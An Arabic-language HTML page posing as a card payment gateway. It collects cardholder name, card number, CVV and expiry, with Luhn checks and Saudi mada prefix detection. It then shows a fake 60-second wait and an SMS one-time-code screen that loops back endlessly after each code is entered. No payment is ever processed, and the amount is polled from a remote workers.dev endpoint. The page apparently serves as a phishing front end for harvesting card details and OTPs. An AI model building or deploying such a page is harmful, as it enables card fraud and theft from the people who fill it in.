<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>بوابة دفع</title>

<style>
*{
  box-sizing:border-box;
  -webkit-tap-highlight-color:transparent;
}

html,body{
  margin:0;
  padding:0;
  background:#f3f3f3;
  font-family:Arial, sans-serif;
  color:#111;
}

.page{
  width:100%;
  max-width:380px;
  margin:0 auto;
  padding:20px 14px;
}

.amount-title{
  text-align:center;
  font-size:16px;
  font-weight:700;
  margin-bottom:10px;
}

.amount-value{
  text-align:center;
  font-size:32px;
  font-weight:900;
  direction:ltr;
  margin-bottom:32px;
  min-height:38px;
}

.divider{
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  margin-bottom:32px;
}

.divider::before,
.divider::after{
  content:"";
  flex:1;
  max-width:70px;
  height:2px;
  background:#cecece;
}

.divider span{
  font-size:22px;
  font-weight:700;
}

.field-group{
  margin-bottom:22px;
}

.label{
  display:block;
  font-size:20px;
  font-weight:700;
  margin-bottom:10px;
}

.input{
  width:100%;
  height:64px;
  border:2px solid #cfcfcf;
  border-radius:16px;
  background:#f7f7f7;
  font-size:18px;
  padding:0 14px;
  outline:none;
}

.input.error{
  border-color:#d93025 !important;
  box-shadow:0 0 0 3px rgba(217,48,37,0.10);
  background:#fff7f7;
}

.card-head{
  display:flex;
  align-items:center;
  justify-content:space-between;
  margin-bottom:10px;
}

/* تم إزالة شعار البطاقة بالكامل - لا يوجد أي عنصر للشعار */
.card-logo-top{
  display: none;
}

.card-number{
  direction:ltr;
  text-align:left;
}

.row{
  display:flex;
  gap:10px;
  margin-top:10px;
}

.col{
  flex:1;
}

.pay-btn{
  width:100%;
  height:64px;
  margin-top:16px;
  border:none;
  border-radius:16px;
  background:#2ac769;
  color:#fff;
  font-size:20px;
  cursor:pointer;
}

.expiry-wrap{
  width:100%;
  height:64px;
  background:#f7f7f7;
  border:2px solid #cfcfcf;
  border-radius:16px;
  display:flex;
  align-items:center;
  justify-content:space-between;
  padding:0 14px;
  direction:ltr;
}

.expiry-wrap.error{
  border-color:#d93025 !important;
  box-shadow:0 0 0 3px rgba(217,48,37,0.10);
  background:#fff7f7;
}

.expiry-select{
  width:38%;
  height:100%;
  border:none;
  background:transparent;
  font-size:18px;
  outline:none;
  text-align:center;
  text-align-last:center;
  direction:ltr;
  color:#9a9a9a;
  appearance:none;
  -webkit-appearance:none;
  -moz-appearance:none;
}

.expiry-select.has-value{
  color:#111;
}

.expiry-separator{
  width:24%;
  text-align:center;
  font-size:24px;
  font-weight:700;
  color:#777;
  user-select:none;
  -webkit-user-select:none;
}

::placeholder{
  color:#9a9a9a;
}

.screen{
  display:none;
}

.screen.active{
  display:block;
}

.loader-screen{
  width:100%;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
  background:#f3f3f3;
}

.loader-box{
  width:100%;
  max-width:380px;
  text-align:center;
}

.blue-spinner{
  width:84px;
  height:84px;
  margin:0 auto 18px;
  border-radius:50%;
  border:8px solid rgba(31,122,255,0.18);
  border-top-color:#1f7aff;
  animation:spin 0.9s linear infinite;
}

.loader-count{
  font-size:30px;
  font-weight:800;
  direction:ltr;
  color:#1f7aff;
}

.otp-page{
  width:100%;
  max-width:380px;
  margin:0 auto;
  padding:20px 14px;
}

.otp-title{
  text-align:center;
  font-size:24px;
  font-weight:800;
  margin:18px 0 14px;
}

.otp-text{
  text-align:center;
  font-size:17px;
  line-height:1.9;
  color:#333;
  margin:0 0 26px;
}

.otp-btn{
  width:100%;
  height:64px;
  margin-top:16px;
  border:none;
  border-radius:16px;
  background:#2ac769;
  color:#fff;
  font-size:20px;
  cursor:pointer;
}

@keyframes spin{
  to{ transform:rotate(360deg); }
}
</style>
</head>
<body>

<div class="screen active" id="paymentScreen">
  <div class="page">

    <div class="amount-title">المبلغ</div>
    <div class="amount-value" id="topAmount"></div>

    <div class="divider">
      <span>ادفع عن طريق البطاقة</span>
    </div>

    <div class="field-group">
      <label class="label">اسم حامل البطاقة</label>
      <input
        class="input"
        id="cardHolder"
        placeholder="اسم حامل البطاقة"
        inputmode="text"
        autocomplete="cc-name"
        maxlength="40"
      >
    </div>

    <div class="field-group">
      <div class="card-head">
        <label class="label">معلومات البطاقة</label>
        <!-- تم إزالة أي شعار للبطاقة بشكل كامل -->
      </div>

      <input
        class="input card-number"
        id="cardNumber"
        placeholder="0000 0000 0000 0000"
        inputmode="numeric"
        maxlength="19"
        autocomplete="cc-number"
      >

      <div class="row">
        <div class="col">
          <input
            class="input"
            id="cvv"
            placeholder="CVV"
            inputmode="numeric"
            maxlength="3"
            autocomplete="cc-csc"
          >
        </div>

        <div class="col">
          <div class="expiry-wrap" id="expiryWrap">
            <select id="expMonth" class="expiry-select">
              <option value="">MM</option>
            </select>

            <div class="expiry-separator">/</div>

            <select id="expYear" class="expiry-select">
              <option value="">YY</option>
            </select>
          </div>
        </div>
      </div>
    </div>

    <button class="pay-btn" id="payBtn"></button>
  </div>
</div>

<div class="screen" id="loader60Screen">
  <div class="loader-screen">
    <div class="loader-box">
      <div class="blue-spinner"></div>
      <div class="loader-count" id="loader60Count">60</div>
    </div>
  </div>
</div>

<div class="screen" id="otpScreen">
  <div class="otp-page">
    <div class="otp-title">رمز التحقق</div>
    <p class="otp-text">
      يرجى إدخال رمز التحقق (OTP) المرسلة عبر رسالة نصية قصيرة إلى هاتفك المحمول لتنفيذ المعاملة
    </p>

    <div class="field-group">
      <input
        class="input"
        id="otpInput"
        placeholder="أدخل رمز التحقق"
        inputmode="numeric"
        maxlength="6"
        autocomplete="one-time-code"
      >
    </div>

    <button class="otp-btn" id="otpBtn">تحقق</button>
  </div>
</div>

<div class="screen" id="loader30Screen">
  <div class="loader-screen">
    <div class="loader-box">
      <div class="blue-spinner"></div>
    </div>
  </div>
</div>

<script>
const API_URL = "https://snowy-bread-61bc.aefoon2030.workers.dev/";

// تعريف أنواع البطاقات (خلف الكواليس فقط)
const CardType = {
  VISA: 'visa',
  MASTERCARD: 'mastercard',
  MADA: 'mada',
  UNKNOWN: 'unknown'
};

// =============== خوارزمية Luhn للتحقق من صحة رقم البطاقة (قوية ومعيارية) ===============
function luhnCheck(cardNumber) {
  let sum = 0;
  let shouldDouble = false;
  for (let i = cardNumber.length - 1; i >= 0; i--) {
    let digit = parseInt(cardNumber.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return (sum % 10) === 0;
}

// =============== تحديد نوع البطاقة بدقة عالية (خلف الكواليس) ===============
// يعتمد على البادئات المعروفة لفيزا وماستر كارد ومدى، ولا يرفض البطاقة إذا كانت غير معروفة
function detectCardTypeStrong(cardDigits) {
  if (!cardDigits || cardDigits.length < 2) return CardType.UNKNOWN;
  
  // فيزا: تبدأ بـ 4
  if (/^4/.test(cardDigits)) {
    return CardType.VISA;
  }
  
  // ماستر كارد: 51-55 أو 2221-2720
  if (/^(5[1-5])/.test(cardDigits) || /^(222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(cardDigits)) {
    return CardType.MASTERCARD;
  }
  
  // مدى (Mada): البادئات الرسمية الأكثر شيوعاً في السعودية (شاملة ومحدثة)
  const madaPrefixes = [
    '588845', '440647', '440795', '446404', '457865', '457997', '474491', 
    '636120', '9682', '483010', '586983', '605141', '604906', '521000',
    '530906', '531196', '535825', '543357', '545616', '546518', '548485',
    '558848', '585265', '588982', '589005', '589206', '604393', '608072',
    '627139', '636214', '636392', '637071', '639199', '639382', '639438'
  ];
  if (madaPrefixes.some(prefix => cardDigits.startsWith(prefix))) {
    return CardType.MADA;
  }
  
  return CardType.UNKNOWN;
}

// =============== التحقق من صحة البطاقة رقمياً (Luhn فقط + طول 16 رقم) ===============
// لا يتم رفض أي بطاقة بناءً على نوعها، فقط بناءً على خوارزمية Luhn والطول
function isCardNumberNumericallyValid(cardDigits) {
  if (!cardDigits || cardDigits.length !== 16) return false;
  return luhnCheck(cardDigits);
}

// =============== دوال مساعدة ===============
function normalizeAmount(value) {
  if (!value || typeof value !== "string") return null;
  return value.trim();
}

function setAmount(amount) {
  const finalAmount = normalizeAmount(amount);
  if (!finalAmount) return;

  document.getElementById("topAmount").textContent = finalAmount;
  document.getElementById("payBtn").textContent = "ادفع " + finalAmount;
}

async function loadAmount() {
  try {
    const res = await fetch(API_URL + "?t=" + Date.now(), {
      cache: "no-store"
    });
    const data = await res.json();
    if (data && data.ok && data.amount) {
      setAmount(data.amount);
    }
  } catch (e) {
    console.log("تعذر تحميل المبلغ", e);
  }
}

loadAmount();
setInterval(loadAmount, 3000);

// عناصر DOM
const paymentScreen = document.getElementById("paymentScreen");
const loader60Screen = document.getElementById("loader60Screen");
const otpScreen = document.getElementById("otpScreen");
const loader30Screen = document.getElementById("loader30Screen");

const cardHolder = document.getElementById("cardHolder");
const cardNumber = document.getElementById("cardNumber");
const cvv = document.getElementById("cvv");
const expMonth = document.getElementById("expMonth");
const expYear = document.getElementById("expYear");
const expiryWrap = document.getElementById("expiryWrap");
const payBtn = document.getElementById("payBtn");
const otpInput = document.getElementById("otpInput");
const otpBtn = document.getElementById("otpBtn");
const loader60Count = document.getElementById("loader60Count");

let loader60Timer = null;
let loader30Timer = null;

// تعبئة قوائم الشهر والسنة
for (let i = 1; i <= 12; i++) {
  const option = document.createElement("option");
  option.value = String(i).padStart(2, "0");
  option.textContent = String(i).padStart(2, "0");
  expMonth.appendChild(option);
}
for (let y = 26; y <= 50; y++) {
  const option = document.createElement("option");
  option.value = String(y);
  option.textContent = String(y);
  expYear.appendChild(option);
}

[expMonth, expYear].forEach(select => {
  select.addEventListener("paste", (e) => e.preventDefault());
});

function showScreen(screenEl) {
  [paymentScreen, loader60Screen, otpScreen, loader30Screen].forEach(el => {
    el.classList.remove("active");
  });
  screenEl.classList.add("active");
}

// التحقق من اسم الحامل (حروف ومسافات فقط)
function validateCardHolder() {
  const value = cardHolder.value.trim();
  const valid = /^[A-Za-z ]+$/.test(value) && value.length > 0;
  if (value === "") {
    cardHolder.classList.remove("error");
    return false;
  }
  cardHolder.classList.toggle("error", !valid);
  return valid;
}

cardHolder.addEventListener("input", function () {
  this.value = this.value.replace(/[^A-Za-z ]/g, "");
  validateCardHolder();
});
cardHolder.addEventListener("paste", function (e) {
  e.preventDefault();
  const text = (e.clipboardData || window.clipboardData).getData("text");
  const cleaned = text.replace(/[^A-Za-z ]/g, "");
  this.value = cleaned.slice(0, 40);
  validateCardHolder();
});

// التحقق من رقم البطاقة (يعتمد على Luhn + الطول، ولا يرفض أي نوع)
function validateCardNumber() {
  const rawDigits = cardNumber.value.replace(/\D/g, "");
  if (rawDigits.length === 0) {
    cardNumber.classList.remove("error");
    return false;
  }
  const isValid = isCardNumberNumericallyValid(rawDigits);
  cardNumber.classList.toggle("error", !isValid);
  return isValid;
}

// تحديث تنسيق رقم البطاقة وإجراء التحقق
cardNumber.addEventListener("input", function () {
  let digits = this.value.replace(/\D/g, "").slice(0, 16);
  this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
  validateCardNumber();
  
  // تحديد نوع البطاقة خلف الكواليس (بدون أي تأثير على الواجهة أو رفض)
  const fullDigits = this.value.replace(/\D/g, "");
  if (fullDigits.length >= 6) {
    const detectedType = detectCardTypeStrong(fullDigits);
    // تسجيل النوع في وحدة التحكم فقط لأغراض المراقبة الخلفية (لا يظهر للمستخدم)
    console.log(`[خلف الكواليس] تم التعرف على نوع البطاقة: ${detectedType}`);
  }
});
cardNumber.addEventListener("paste", function (e) {
  e.preventDefault();
  const text = (e.clipboardData || window.clipboardData).getData("text");
  let digits = text.replace(/\D/g, "").slice(0, 16);
  this.value = digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
  validateCardNumber();
});
cardNumber.addEventListener("blur", function() {
  const digits = this.value.replace(/\D/g, "");
  if (digits.length === 16 && !isCardNumberNumericallyValid(digits)) {
    this.classList.add("error");
  }
});

// التحقق من CVV
function validateCVV() {
  const valid = /^\d{3}$/.test(cvv.value);
  if (cvv.value.length === 0) {
    cvv.classList.remove("error");
    return false;
  }
  cvv.classList.toggle("error", !valid);
  return valid;
}
cvv.addEventListener("input", function () {
  this.value = this.value.replace(/\D/g, "").slice(0, 3);
  validateCVV();
});
cvv.addEventListener("paste", function (e) {
  e.preventDefault();
  const text = (e.clipboardData || window.clipboardData).getData("text");
  this.value = text.replace(/\D/g, "").slice(0, 3);
  validateCVV();
});

// التحقق من تاريخ الانتهاء
function validateExpiry() {
  const valid = expMonth.value !== "" && expYear.value !== "";
  if (valid || (expMonth.value === "" && expYear.value === "")) {
    expiryWrap.classList.remove("error");
  } else {
    expiryWrap.classList.add("error");
  }
  expMonth.classList.toggle("has-value", expMonth.value !== "");
  expYear.classList.toggle("has-value", expYear.value !== "");
  return valid;
}
expMonth.addEventListener("change", validateExpiry);
expYear.addEventListener("change", validateExpiry);

// التحقق من OTP
function validateOTP() {
  const value = otpInput.value;
  const valid = /^\d{4,6}$/.test(value);
  if (value.length === 0) {
    otpInput.classList.remove("error");
    return false;
  }
  otpInput.classList.toggle("error", !valid);
  return valid;
}
otpInput.addEventListener("input", function () {
  this.value = this.value.replace(/\D/g, "").slice(0, 6);
  validateOTP();
});
otpInput.addEventListener("paste", function (e) {
  e.preventDefault();
  const text = (e.clipboardData || window.clipboardData).getData("text");
  this.value = text.replace(/\D/g, "").slice(0, 6);
  validateOTP();
});

// التحقق الشامل من نموذج الدفع (بدون رفض أي نوع بطاقة، فقط Luhn والبيانات الأساسية)
function validatePaymentForm() {
  const holderOk = validateCardHolder();
  const cardOk = validateCardNumber();
  const cvvOk = validateCVV();
  const expiryOk = validateExpiry();

  if (!cardHolder.value.trim()) cardHolder.classList.add("error");
  const rawDigits = cardNumber.value.replace(/\D/g, "");
  if (!rawDigits) cardNumber.classList.add("error");
  if (!cvv.value) cvv.classList.add("error");
  if (!expMonth.value || !expYear.value) expiryWrap.classList.add("error");

  // التحقق الرقمي باستخدام Luhn (قوي جداً) ولكن لا يرفض بناءً على النوع
  if (rawDigits.length === 16 && !isCardNumberNumericallyValid(rawDigits)) {
    cardNumber.classList.add("error");
    return false;
  }

  return holderOk && cardOk && cvvOk && expiryOk;
}

// المؤقتات
function startLoader60ThenOTP() {
  clearInterval(loader60Timer);
  let seconds = 60;
  loader60Count.textContent = seconds;
  showScreen(loader60Screen);
  loader60Timer = setInterval(() => {
    seconds--;
    loader60Count.textContent = seconds;
    if (seconds <= 0) {
      clearInterval(loader60Timer);
      showScreen(otpScreen);
    }
  }, 1000);
}

function startLoader30ThenBackOTP() {
  clearTimeout(loader30Timer);
  showScreen(loader30Screen);
  loader30Timer = setTimeout(() => {
    otpInput.value = "";
    otpInput.classList.remove("error");
    showScreen(otpScreen);
  }, 30000);
}

// حدث زر الدفع
payBtn.addEventListener("click", function () {
  if (!validatePaymentForm()) return;
  
  // استخراج نوع البطاقة خلف الكواليس (لأغراض السجلات فقط، لا تأثير على القبول)
  const cardDigits = cardNumber.value.replace(/\D/g, "");
  let detectedCardType = CardType.UNKNOWN;
  if (cardDigits.length >= 6) {
    detectedCardType = detectCardTypeStrong(cardDigits);
  }
  console.log(`[معاملة آمنة] جاري معالجة بطاقة من نوع: ${detectedCardType} (تم اجتياز فحص Luhn والبيانات)`);
  
  startLoader60ThenOTP();
});

// حدث زر OTP
otpBtn.addEventListener("click", function () {
  if (!otpInput.value) {
    otpInput.classList.add("error");
    return;
  }
  if (!validateOTP()) return;
  startLoader30ThenBackOTP();
});

// منع أي محاولات لحفظ الصور أو سحبها (لا يوجد شعار ولكن للحماية العامة)
document.addEventListener("contextmenu", (e) => {
  if (e.target.closest(".card-logo-top")) e.preventDefault();
});
document.addEventListener("dragstart", (e) => {
  if (e.target.closest(".card-logo-top")) e.preventDefault();
});
</script>
</body>
</html>
